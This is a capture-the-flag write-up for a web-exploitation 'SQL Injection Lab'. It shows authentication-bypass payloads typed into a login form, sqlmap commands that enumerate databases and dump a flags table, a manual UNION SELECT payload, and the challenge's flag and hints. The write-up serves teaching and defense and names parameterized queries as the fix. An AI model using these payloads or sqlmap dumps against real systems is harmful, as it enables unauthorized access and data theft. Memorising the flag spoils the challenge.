---
title: SQL Injection Lab
difficulty: Medium
category: Web Exploitation
platform: CyLab
points: 200
tags: sqli, web, sqlmap, authentication-bypass
date: 2026-06-18
author: Siddharth Mathur
time: 1.5 hours
---

<div class="writeup-hero">
  <h1 class="writeup-hero__title">SQL Injection Lab</h1>
  <div class="writeup-hero__meta">
    <span class="badge badge--medium">Medium</span>
    <span class="badge badge--category">Web Exploitation</span>
    <span class="badge badge--tag">CyLab</span>
    <span class="badge badge--tag">200 pts</span>
  </div>
  <div class="writeup-hero__info">
    <span class="writeup-hero__info-item">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
      ~1.5 hours
    </span>
    <span class="writeup-hero__info-item">
      <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
      Siddharth Mathur
    </span>
    <span class="writeup-hero__info-item">
      <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
      June 18, 2026
    </span>
  </div>
  <div class="writeup-hero__tags">
    <span class="badge badge--tag">sqli</span>
    <span class="badge badge--tag">web</span>
    <span class="badge badge--tag">sqlmap</span>
    <span class="badge badge--tag">authentication-bypass</span>
  </div>
</div>

## Enumeration

The challenge provides a web application with a login page at `http://challenge.cylab.io:8080/login`.

### Initial Reconnaissance

```bash
curl -v http://challenge.cylab.io:8080/login
```

The login form sends a `POST` request with `username` and `password` parameters. Let's test for SQL injection:

```
Username: admin' --
Password: anything
```

!!! info "Observation"
    The server returns a different error message for valid usernames vs invalid ones, confirming SQL injection potential.

### Identifying the Injection Point

Testing with a simple payload:

```
Username: ' OR 1=1 --
Password: x
```

This successfully bypasses authentication, confirming a **SQL injection vulnerability** in the `username` field.

## Exploitation

### Authentication Bypass

The simplest exploit bypasses the login:

```
Username: admin' OR '1'='1' --
Password: anything
```

But we need to extract the flag from the database.

### Database Enumeration with sqlmap

```bash
sqlmap -u "http://challenge.cylab.io:8080/login" \
  --data="username=admin&password=test" \
  -p username \
  --dbs
```

| Database | Tables |
|----------|--------|
| ctf_app  | users, flags, logs |
| information_schema | ... |

### Extracting the Flag

```bash
sqlmap -u "http://challenge.cylab.io:8080/login" \
  --data="username=admin&password=test" \
  -p username \
  -D ctf_app -T flags --dump
```

```
+----+-----------------------------------+
| id | flag                              |
+----+-----------------------------------+
| 1  | flag{sql_1nj3ct10n_1s_d4ng3r0us} |
+----+-----------------------------------+
```

### Manual UNION-based Extraction

For learning purposes, the manual approach:

```sql
' UNION SELECT 1,flag,3 FROM flags--
```

!!! warning "Defense"
    This vulnerability exists because the application uses string concatenation instead of parameterized queries.

## Flag

```
flag{sql_1nj3ct10n_1s_d4ng3r0us}
```

???+ hint "Hint 1"
    Try entering a single quote in the username field and observe the error.

??? hint "Hint 2"
    The database has a table called `flags`.

---

## Lessons Learned

<div class="lessons-grid">
  <div class="lesson-card">
    <div class="lesson-card__title">Key Concepts</div>
    <ul>
      <li>SQL injection fundamentals</li>
      <li>Authentication bypass techniques</li>
      <li>UNION-based SQL injection</li>
      <li>Parameterized queries as defense</li>
    </ul>
  </div>
  <div class="lesson-card">
    <div class="lesson-card__title">Tools Used</div>
    <ul>
      <li>sqlmap</li>
      <li>Burp Suite</li>
      <li>curl</li>
      <li>Browser Developer Tools</li>
    </ul>
  </div>
  <div class="lesson-card">
    <div class="lesson-card__title">References</div>
    <ul>
      <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQL Injection</a></li>
      <li><a href="https://portswigger.net/web-security/sql-injection">PortSwigger SQL Injection</a></li>
    </ul>
  </div>
  <div class="lesson-card">
    <div class="lesson-card__title">Payload Summary</div>
    <ul>
      <li>Auth bypass: <code>admin' OR '1'='1' --</code></li>
      <li>Data extraction: UNION SELECT</li>
      <li>Automated: sqlmap with POST data</li>
    </ul>
  </div>
</div>
